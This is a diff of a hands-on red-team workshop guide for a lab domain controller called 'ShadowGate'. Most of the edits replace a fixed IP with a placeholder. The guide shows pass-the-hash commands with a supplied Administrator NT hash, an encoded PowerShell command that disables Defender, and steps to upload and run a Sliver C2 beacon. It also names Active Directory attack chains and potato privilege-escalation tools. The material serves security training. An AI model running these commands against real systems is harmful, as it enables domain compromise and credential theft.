@@ -8,7 +8,7 @@ The hands-on attack chain: from a deployed lab and validated C2 to a Sliver beac
 | ------------- | ------------------------------------------------------------------------ |
 | Depends on    | DEPLOY (tunnel up, target reachable) + CONFIG (Sliver listener live)     |
 | Format        | Hands-on, every attendee against their own instanced ShadowGate         |
-| Target        | `DC01.shadow.gate` at `10.1.132.39` (Windows Server 2022 DC)             |
+| Target        | `DC01.shadow.gate` at `<ShadowGate IP>` (Windows Server 2022 DC)             |
 | C2            | Sliver drives; Mythic and Havoc beacons staged on the target through it |
 | Two paths     | Operator to target over the tunnel; target to redirector over the public EIP |
 | End state     | SYSTEM on ShadowGate via Sliver, all three C2s landed, then teardown    |
@@ -34,7 +34,7 @@ Confirm before starting. If any fails, fix it in DEPLOY or CONFIG before continu
 Tunnel up and target reachable (from DEPLOY Phase 3). From the redirector (Guacamole > Redirector SSH):
 
 ```bash
-ping -c3 10.1.132.39
+ping -c3 <ShadowGate IP>
 ```
 
 Sliver listener live (from CONFIG Phase A). In the Sliver console:
@@ -45,7 +45,7 @@ jobs
 
 Should list the HTTPS listener on port 443.
 
-Target IP. ShadowGate sits at `10.1.132.39`, inside the `vpn_tunnel_cidrs` you set (`10.1.0.0/16` by default). If your HSL portal ever shows a different address for your instance, use that value throughout instead.
+Target IP. ShadowGate's address is per-instance and changes by location, so this guide writes it as `<ShadowGate IP>` instead of a fixed value. Read your assigned address off the HSL portal for your instance and substitute it everywhere `<ShadowGate IP>` appears. Confirm it falls inside the `vpn_tunnel_cidrs` you set (`10.1.0.0/16` by default); if your address sits in a different range, change the CIDR to contain it.
 
 ---
 
@@ -62,18 +62,18 @@ ip route
 Fingerprint DC01 (SMB, Kerberos, LDAP, AD CS web enrollment):
 
 ```bash
-nmap -Pn -sC -sV 10.1.132.39
+nmap -Pn -sC -sV <ShadowGate IP>
 ```
 
 Add the host entry so domain tooling resolves names:
 
 ```bash
-echo '10.1.132.39  DC01.shadow.gate shadow.gate DC01' | sudo tee -a /etc/hosts
+echo '<ShadowGate IP>  DC01.shadow.gate shadow.gate DC01' | sudo tee -a /etc/hosts
 ```
 
 Success: nmap returns the domain controller's services (53, 88, 389, 445, 636, 5985 and the AD CS HTTP endpoint). The tunnel is carrying operator traffic.
 
-If it fails: nmap timing out means the tunnel is down. Recheck DEPLOY Step 10 (reachability to the target) and that `10.1.132.39` falls inside your `vpn_tunnel_cidrs`.
+If it fails: nmap timing out means the tunnel is down. Recheck DEPLOY Step 10 (reachability to the target) and that `<ShadowGate IP>` falls inside your `vpn_tunnel_cidrs`.
 
 ---
 
@@ -81,10 +81,10 @@ If it fails: nmap timing out means the tunnel is down. Recheck DEPLOY Step 10 (r
 
 The black-box path from zero credentials to Domain Admin is about 40 minutes of AD tradecraft, and it is not what this workshop teaches, so it is whitecarded. The full sequence is in the box creator's walkthrough (https://notes.rosskeddy.ca/cheatsheet/writeups/hacksmarter/shadowgate) and 0xb0b's writeup (CC BY 4.0). Attendees are handed its endpoint:
 
-- Target: `DC01.shadow.gate` at `10.1.132.39`
+- Target: `DC01.shadow.gate` at `<ShadowGate IP>`
 - `Administrator` NT hash: `4366ec0f86e29be2a4a5e87a1ba922ec`
 
-On a domain controller, Domain Admin is local admin, which is what makes the delivery and SYSTEM escalation below work. In one line, the whitecarded chain is: anonymous SMB user enumeration, AS-REP roast of `jtrueblood`, shadow-credential takeover of `bbrown` through a GenericWrite, an ESC8 NTLM relay to AD CS Web Enrollment coerced with PetitPotam to mint a `DC01$` certificate, then DCSync for the domain hashes.
+On a domain controller, Domain Admin is local admin, which is what makes the delivery and SYSTEM escalation below work. In one line, the whitecarded chain is: anonymous SMB user enumeration, AS-REP roast of `jtrueblood`, shadow-credential takeover of `bbrown` through a GenericWrite, an ESC8 NTLM relay to AD CS Web Enrollment coerced with PetitPotam to mint a `DC01$` certificate, then DCSync to recover the `Administrator` hash handed to you above.
 
 ---
 
@@ -101,19 +101,19 @@ scp admin@sliver:/tmp/sysProxy.exe .
 2. Disable Defender on the DC (pass-the-hash, `-nooutput` because AV deletes the wmiexec output file). The encoded command is `Set-MpPreference -DisableRealtimeMonitoring 1`:
 
 ```bash
-impacket-wmiexec -hashes :4366ec0f86e29be2a4a5e87a1ba922ec -nooutput shadow.gate/Administrator@10.1.132.39 'powershell -enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgADEA'
+impacket-wmiexec -hashes :4366ec0f86e29be2a4a5e87a1ba922ec -nooutput shadow.gate/Administrator@<ShadowGate IP> 'powershell -enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgADEA'
 ```
 
 3. Upload the beacon with smbmap (nxc times out on the 35 MB binary):
 
 ```bash
-smbmap -H 10.1.132.39 -d shadow.gate -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec' --upload ./sysProxy.exe 'C$/Windows/Temp/sysProxy.exe'
+smbmap -H <ShadowGate IP> -d shadow.gate -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec' --upload ./sysProxy.exe 'C$/Windows/Temp/sysProxy.exe'
 ```
 
 4. Execute it:
 
 ```bash
-impacket-wmiexec -hashes :4366ec0f86e29be2a4a5e87a1ba922ec -nooutput shadow.gate/Administrator@10.1.132.39 'C:\Windows\Temp\sysProxy.exe'
+impacket-wmiexec -hashes :4366ec0f86e29be2a4a5e87a1ba922ec -nooutput shadow.gate/Administrator@<ShadowGate IP> 'C:\Windows\Temp\sysProxy.exe'
 ```
 
 Confirm the session in Sliver:
@@ -124,9 +124,9 @@ use [SESSION_ID]
 whoami
 ```
 
-Success: a new session from `10.1.132.39` registers and `whoami` returns `SHADOW\Administrator`. This is the beacon, separate from the Windows heartbeat.
+Success: a new session from `<ShadowGate IP>` registers and `whoami` returns `SHADOW\Administrator`. This is the beacon, separate from the Windows heartbeat.
 
-If it fails: watch the redirector for the callback (`sudo tail -f /var/log/apache2/redirector-ssl-access.log`, look for `/cloud/storage/objects/`). No hits means the implant is not executing or cannot reach the public EIP. A decoy 200 means a header or prefix mismatch. Confirm Defender was disabled (step 2 runs before step 3) and verify the upload landed with `smbmap -H 10.1.132.39 -d shadow.gate -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec' -r 'C$/Windows/Temp'`.
+If it fails: watch the redirector for the callback (`sudo tail -f /var/log/apache2/redirector-ssl-access.log`, look for `/cloud/storage/objects/`). No hits means the implant is not executing or cannot reach the public EIP. A decoy 200 means a header or prefix mismatch. Confirm Defender was disabled (step 2 runs before step 3) and verify the upload landed with `smbmap -H <ShadowGate IP> -d shadow.gate -u Administrator -p 'aad3b435b51404eeaad3b435b51404ee:4366ec0f86e29be2a4a5e87a1ba922ec' -r 'C$/Windows/Temp'`.
 
 ---
 
@@ -209,18 +209,11 @@ If it fails: if the new session never appears, re-confirm the task path echoed w
 
 ---
 
-## Phase 6: Objective and the SYSTEM exercise
+## Phase 6: The SYSTEM exercise
 
-SYSTEM on `DC01` via Sliver is the demonstrated objective. Capture proof:
+SYSTEM on `DC01` via Sliver is done: Phase 5 took the Administrator beacon to SYSTEM with a scheduled task. Now do the same in the other two frameworks.
 
-```text
-getuid                # S-1-5-18 / NT AUTHORITY\SYSTEM
-hashdump              # domain hashes from the DC
-```
-
-Success: SYSTEM on the domain controller, domain hashes in hand.
-
-Your turn. You watched Sliver go from Administrator to SYSTEM with a scheduled task. The Mythic and Havoc beacons from Phase 4 are sitting at Administrator on the same DC, and every one of them holds `SeImpersonatePrivilege`, so the token-abuse ("potato") family is open to you. Land a SYSTEM callback in all three frameworks. Some routes to try:
+Your turn. The Mythic and Havoc beacons from Phase 4 are sitting at Administrator on the same DC, and every one of them holds `SeImpersonatePrivilege`, so the token-abuse ("potato") family is open to you. Land a SYSTEM callback in Mythic and Havoc as well. Some routes to try:
 
 - Mythic (Apollo): GodPotato, run through Apollo's `execute_assembly` (or SigmaPotato, https://github.com/tylerdotrar/SigmaPotato, a GodPotato successor built for reflective in-memory loading). It abuses `SeImpersonatePrivilege` over DCOM, so it needs no Print Spooler and works cleanly on a domain controller.
 - Havoc: Havoc's built-in `token steal` does not work on this box, because on a hardened Server 2022 DC the only SYSTEM tokens live in protected lsass and cannot be duplicated. Two things do work: 
